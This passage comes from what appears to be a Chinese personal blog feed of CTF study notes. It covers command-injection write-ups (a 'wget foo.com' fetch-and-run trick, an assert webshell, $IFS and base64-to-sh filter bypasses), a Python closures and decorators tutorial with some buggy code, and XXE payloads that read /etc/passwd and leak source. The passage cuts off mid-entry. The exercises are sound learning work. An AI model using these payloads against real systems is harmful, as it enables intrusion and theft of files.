vim">&gt;wget\<br>&gt;foo.\<br>&gt;<span class="hljs-keyword">com</span><br><span class="hljs-keyword">ls</span> -t&gt;<span class="hljs-keyword">a</span><br><span class="hljs-keyword">sh</span> <span class="hljs-keyword">a</span><br></code></pre></td></tr></table></figure><p>上述方法为通过命令行重定向<strong>写入命令</strong>，通过ls将这些命令写入文件a，最后执行</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="bugku-shell"><a href="#bugku-shell" class="headerlink" title="bugku shell"></a>bugku shell</h2><p>打开后发现是空白页面，根据提示:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$poc</span>=<span class="hljs-string">&quot;a#s#s#e#r#t&quot;</span>;<br><span class="hljs-variable">$poc_1</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;#&quot;</span>,<span class="hljs-variable">$poc</span>);   <span class="hljs-comment">//把字符打散为数组</span><br><span class="hljs-variable">$poc_2</span>=<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">3</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">4</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">5</span>]; <span class="hljs-comment">//asset</span><br><span class="hljs-variable">$poc_2</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]);<span class="hljs-comment">//asset($_GET[&#x27;s&#x27;]); asset():判断1个表达式是否成立，返回True和False(重点在于:里面的表达式会被执行)</span><br></code></pre></td></tr></table></figure><p>于是输入&#x2F;?s&#x3D;system(‘ls’)<br>返回: flaga15808abee46a1d5.txt index.php </p><p>所以这题讲了个啥？ 好像是科普了一个一句话木马<br>科普: assert是能执行shell命令的危险函数之一</p><h2 id="ping-ping-ping-GXYCTF-命令联合执行"><a href="#ping-ping-ping-GXYCTF-命令联合执行" class="headerlink" title="ping_ping_ping GXYCTF  命令联合执行"></a>ping_ping_ping GXYCTF  命令联合执行</h2><p>进入后是一个ping网址，这类题见了8下3次了，属于命令执行漏洞(或sql注入)，需要对linux指令有一定了解<br>(这种网站路由器种经常会见到)<br>输入127.0.0.1，ping成功了，说明有命令执行漏洞(为什么呢? 某个wp说的，俺也8清楚….)<br>然后因为贫瘠的linux知识，于是先试试sql注入吧<br>闭合失败…..<br>那就是命令执行漏洞了<br>开始注</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">/?ip=127.0.0.1 | <span class="hljs-built_in">ls</span>     //成功回显flag.php<br>/?ip=127.0.0.1;<span class="hljs-built_in">cat</span> flag.php      //回显<span class="hljs-string">&quot;fuxk your space&quot;</span>，说明检测空格，需要绕过   <br>/?ip=127.0.0.1;<span class="hljs-built_in">cat</span><span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-variable">$9index</span>.php     //回显<span class="hljs-string">&quot;fuxk your symbol&quot;</span>，没看懂....这下没辙了<br>/?ip=127.0.0.1;<span class="hljs-built_in">cat</span>%20flag.php    //<span class="hljs-string">&quot;fuxk your flag&quot;</span>，屏蔽flag关键词<br>/?ip=127.0.0.1|<span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$9</span>`<span class="hljs-built_in">ls</span>`     //回显了index.php的内容<br></code></pre></td></tr></table></figure><p>但是为什么只有后半部分的内容?</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-operator">/?</span>ip<span class="hljs-operator">=</span><br><span class="hljs-operator">|</span>\&#x27;<span class="hljs-operator">|</span>\<span class="hljs-string">&quot;|<span class="hljs-subst">\\</span>|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\)</span>|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>))&#123;<br>    echo preg_match(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|<span class="hljs-subst">\&#x27;</span>|<span class="hljs-subst">\&quot;</span>|<span class="hljs-subst">\\</span>|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\)</span>|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>);  <span class="hljs-comment">//屏蔽了....特殊字符，正则匹配还是没学好....&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#x27; &quot; \ () [] &#123;&#125;  空格</span><br>    die(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;   <span class="hljs-comment">//屏蔽空格</span><br>    die(<span class="hljs-string">&quot;fxck your space!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/bash/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;    <span class="hljs-comment">//屏蔽关键词</span><br>    die(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;   <span class="hljs-comment">//屏蔽flag，贪婪匹配</span><br>    die(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br>  &#125;<br>  <span class="hljs-variable">$a</span> <span class="hljs-operator">=</span> shell_exec(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.<span class="hljs-variable">$ip</span>);    <span class="hljs-comment">//执行</span><br>  echo <span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span>;<br>  print_r(<span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-operator">?&gt;</span><br></code></pre></td></tr></table></figure><p>好吧…前3个都能想办法绕过，但第4个….<br>有几种方法，都记录一下</p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;a=g;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1fla</span><span class="hljs-variable">$a</span>.php有flag<br>?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;b=ag;a=<span class="hljs-built_in">fl</span>;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span><span class="hljs-variable">$a</span><span class="hljs-variable">$b</span>.php 有flag<br></code></pre></td></tr></table></figure><p>然后有一些疑惑的地方:<br>为什么最终flag是在源码的注释里写的? 想了想明白了，这个是出题人挖的坑，因为flag.php文件写的flag就是用注释括起来的，于是最终嵌入html代码时就会只在源码中显示</p><h3 id="bash-sh-base64"><a href="#bash-sh-base64" class="headerlink" title="bash $ sh +base64"></a>bash $ sh +base64</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;echo<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span>-d|bash  <span class="hljs-regexp">//</span>将flag.php进行base64编码，然后<span class="hljs-string">&#x27;bash&#x27;</span>指执行前面的echo脚本(和源码拼接起来)<br><span class="hljs-regexp">//</span>当然这里的bash被过滤了，但是用sh也是一样滴<br>?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;echo<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span>-d|sh<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python闭包特性&amp;&amp;python函数装饰器</title>
    <link href="/2022/03/07/%E9%97%AD%E5%8C%85%E7%89%B9%E6%80%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E7%94%A8%E9%80%94-%E6%8A%84/"/>
    <url>/2022/03/07/%E9%97%AD%E5%8C%85%E7%89%B9%E6%80%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E7%94%A8%E9%80%94-%E6%8A%84/</url>
    
    <content type="html"><![CDATA[<p>学习中闭包的特性利用笔记&amp;&amp;python函数装饰器<br>本质是python的’一切皆对象’(雾)</p><h1 id="闭包的特性利用"><a href="#闭包的特性利用" class="headerlink" title="闭包的特性利用"></a>闭包的特性利用</h1><p>闭包的1个重要特性是:  python里嵌套函数阔以记得使用过的外部函数<br>甚么意思捏?<br>eg:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">bar</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;dick&quot;</span>)<br>    <span class="hljs-keyword">return</span> bar  <span class="hljs-comment">#这里是return bar而8是return bar()</span><br>a=foo()<br>a()<br></code></pre></td></tr></table></figure><p>结果:</p><blockquote><blockquote><blockquote><p>dick</p></blockquote></blockquote></blockquote><p>上述代码函数内写了个函数bar(), 并把bar()函数作为1个变量返回(因为py中，函数和变量等价，等价，等价)</p><p>而在此介绍py闭包的一个特性:嵌套函数会记住使用过的外部变量</p><p>eg:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">e</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params">e</span>):<br>        <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">return</span> bar<br><br>a=foo(<span class="hljs-string">&quot;shit&quot;</span>)<br>a()<br></code></pre></td></tr></table></figure><p>结果:</p><blockquote><blockquote><blockquote><p>shit</p></blockquote></blockquote></blockquote><p>上述代码和python的特性8符合，当return bar之后，e作为局部变量会被销毁，但是结果却成功输出了，这就因为python的另一个特性: 嵌套函数会记住使用过的外部变量(局部变量销毁后仍会被嵌套函数记住)</p><p>所以这个特性有毛用呢？</p><h2 id="用来生成8同函数"><a href="#用来生成8同函数" class="headerlink" title="用来生成8同函数"></a>用来生成8同函数</h2><p>eg:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">e1</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params">e2</span>):<br>        <span class="hljs-keyword">return</span> e1+e2<br>    <span class="hljs-keyword">return</span> bar<br><br>a=foo(<span class="hljs-number">100</span>)<br>a(<span class="hljs-number">200</span>)<br></code></pre></td></tr></table></figure><p>result:</p><blockquote><blockquote><blockquote><p>300<br>上述例子就可以利用该特性批量生成8同函数</p></blockquote></blockquote></blockquote><p>还有什么用呢?好像没了</p><h2 id="可以取代生成全局变量"><a href="#可以取代生成全局变量" class="headerlink" title="可以取代生成全局变量"></a>可以取代生成全局变量</h2><p>eg:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">x</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">y</span>(<span class="hljs-params">a,b</span>):<br>        <span class="hljs-built_in">print</span>(a,b)<br>    <span class="hljs-keyword">return</span> y<br></code></pre></td></tr></table></figure><h1 id="函数装饰器"><a href="#函数装饰器" class="headerlink" title="函数装饰器"></a>函数装饰器</h1><p>装饰器本质是函数或者类，他的作用是: 为原来的函数增加新的功能。装饰，顾名思义，就是在事物8变的基础上实现一些扩展</p><p>应用场景: 某天，你用python写了1堆函数，然后你突然想为这些函数加1个相同的功能，比如print(“d1ck”)，那么1个1个改就很麻烦，那么装饰器就派上了用场~</p><p>eg:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func1</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;abc&quot;</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch4nge_func</span>(<span class="hljs-params">func1</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">func2</span>(<span class="hljs-params">func1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d3f&quot;</span>)<br>        <span class="hljs-keyword">return</span> func1<br>    <span class="hljs-keyword">return</span> func2<br><br>f00=ch4nge_func(func1)<br>f00()<br></code></pre></td></tr></table></figure><p>结果:<br>    &gt;&gt;&gt;abc<br>    &gt;&gt;&gt;d3f</p><p>这个函数我没看懂….感觉有点毛病(它func2返回的8还是原来的func1吗?)，但是8太要紧，反正只要知道装饰器大致都是这么写的就好了，然后这样做也实现了修改函数的功能</p><p>然后研究了1下，把这认为是装饰器的1种新姿势吧….上面代码定义ch4nge_func里把return func1换成func1()，结果也还是一样的</p><p>然后写完了ch4nge_func后，再进行调用就阔以实现修改函数的目的啦，有2种调用方式，1种是func2&#x3D;ch4nge_func(func1)就改成了新函数(若8想新生成函数也可func1&#x3D;ch4nge_func(func1))；还有1种那就是用python的语法糖，比如上述代码用语法糖简化就是: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch4nge_func</span>(<span class="hljs-params">func1</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">func2</span>(<span class="hljs-params">func1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d3f&quot;</span>)<br>        <span class="hljs-keyword">return</span> func1<br>    <span class="hljs-keyword">return</span> func2<br><span class="hljs-meta">@ch4nge_func</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func1</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;abc&quot;</span>)<br><span class="hljs-comment">#这里的@ch4nge_func等价于----func1=ch4nge_func(func1)</span><br></code></pre></td></tr></table></figure><p>再深入学习一下，了解一下装饰器的另1特性</p><h2 id="装饰器修改函数后改变了原函数名字-functools-wraps"><a href="#装饰器修改函数后改变了原函数名字-functools-wraps" class="headerlink" title="装饰器修改函数后改变了原函数名字: functools.wraps"></a>装饰器修改函数后改变了原函数名字: functools.wraps</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">abc</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;4bc&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch4nge_func</span>(<span class="hljs-params">func1</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">func2</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d3f&quot;</span>)<br>        func1()<br>    <span class="hljs-keyword">return</span> func2<br><br>abc=ch4nge_func(abc)<br><span class="hljs-built_in">print</span>(abc.__name__)<br></code></pre></td></tr></table></figure><p>运行结果:<br>    &gt;&gt;&gt;func2</p><p>然而你想的打印结果应该是 abc 对8对? 这是因为func2重写了func1和其注释文档，多数情况下无伤大雅，如果你想保持原状，只要用到functools库里的wraps函数就阔以了</p><p>在定义装饰器函数时第一行顺便写入@wraps(‘你传入的func’)就阔以了，eg:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> fuctools<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch4nge</span>(<span class="hljs-params">func1</span>):<br><span class="hljs-meta">    @wraps(<span class="hljs-params">fucn1</span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">func2</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;FuuuuuuuuuuuCk&quot;</span>)<br>        <span class="hljs-keyword">return</span> func1<br>    <span class="hljs-keyword">return</span> func2()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">abc</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;4bc&quot;</span>)<br>abc=ch4nge(abc)<br><span class="hljs-built_in">print</span>(abc.__name__)<br><br></code></pre></td></tr></table></figure><p>结果: &gt;&gt;&gt;abc</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>在web中检查某用户是否有权限访问web某页面: 没看懂，就8贴源码了<br>总之原理先搞懂，应用以后应该会用得上的(咕)</p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxe攻击(2)</title>
    <link href="/2022/02/11/xxe%E6%94%BB%E5%87%BB(2)/"/>
    <url>/2022/02/11/xxe%E6%94%BB%E5%87%BB(2)/</url>
    
    <content type="html"><![CDATA[<p>顺便记录一下常用的linux文件路径，以便抄作业</p><p>开始实战, 2_n3ed_p00000000000000000000000w3r!!!!!!!!!!!!!!!!!!!!!</p><h1 id="fake-xml-NCTF"><a href="#fake-xml-NCTF" class="headerlink" title="fake_xml NCTF"></a>fake_xml NCTF</h1><p>这道题是假的xxe攻击题，flag在页面就能找到，实际上用来熟悉一下操作</p><p>常用php伪协议:<br>file:&#x2F;&#x2F; — 访问本地文件系统<br>http:&#x2F;&#x2F; — 访问 HTTP(s) 网址<br>ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs<br>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）<br>zlib:&#x2F;&#x2F; — 压缩流<br>data:&#x2F;&#x2F; — 数据（RFC 2397）<br>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式<br>phar:&#x2F;&#x2F; — PHP 归档<br>ssh2:&#x2F;&#x2F; — Secure Shell 2<br>rar:&#x2F;&#x2F; — RAR<br>ogg:&#x2F;&#x2F; — 音频流<br>expect:&#x2F;&#x2F; — 处理交互式的流</p><p>(目前会用的也8多，只有file:&#x2F;&#x2F;和php:&#x2F;&#x2F;，以后慢慢填)<br>data:&#x2F;&#x2F;: 写入协议，比如创建text文件并向text文件写入welecome to the zjctf<br>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p><p>首先，进入网页是个登陆界面，于是随便输，然后抓包，发现账户名和密码是以xml形式传输—-</p><p>于是就阔以进行构造payload: </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">  ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后因为file:&#x2F;&#x2F; 读不出来，就用了php:&#x2F;&#x2F;filter过滤函数    —-基操<br>base64转码获得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//账号</span><br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="hljs-comment">//密码</span><br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();   <span class="hljs-comment">//设立对象</span><br><span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);  <span class="hljs-comment">//8管了</span><br><span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);    <span class="hljs-comment">//simplexml_import_dom: 把节点转化为对象----</span><br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h1 id="more-linux下的-etc-passwd以及类似文件解释"><a href="#more-linux下的-etc-passwd以及类似文件解释" class="headerlink" title="more: linux下的&#x2F;etc&#x2F;passwd以及类似文件解释"></a>more: linux下的&#x2F;etc&#x2F;passwd以及类似文件解释</h1><p>在Linux &#x2F;etc&#x2F;passwd文件中每个用户都有一个对应的记录行，它记录了这个用户的一些基本属性。系统管理员经常会接触到这个文件的修改以完成对用户的管理工作。</p><p>哦，好了，我大致明白怎么工作了</p><p>类似还有etc&#x2F;hosts文件等<br>类似还有!! &#x2F;proc&#x2F;net&#x2F;arp  —-8知道啥用，可以获得ip，和hosts一样，好像是用来内网渗透的<br>&#x2F;proc&#x2F;net&#x2F;fib_trie<br>eg: 169.254.1.1</p><p>然后….<br>命令：SYSTEM “<a href="http://169.254.1.1或https//169.254.1.1">http://169.254.1.1或https://169.254.1.1</a>“</p><h1 id="payload作业"><a href="#payload作业" class="headerlink" title="payload作业"></a>payload作业</h1><p>放个典型:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">  ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><br>php://filter/convert.base64-encode/resource=xxx.php<br></code></pre></td></tr></table></figure><h1 id="ture-xml-buuctf"><a href="#ture-xml-buuctf" class="headerlink" title="ture_xml(buuctf)"></a>ture_xml(buuctf)</h1><p>ok…….<br>首先进去是登陆界面，随便填，抓包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 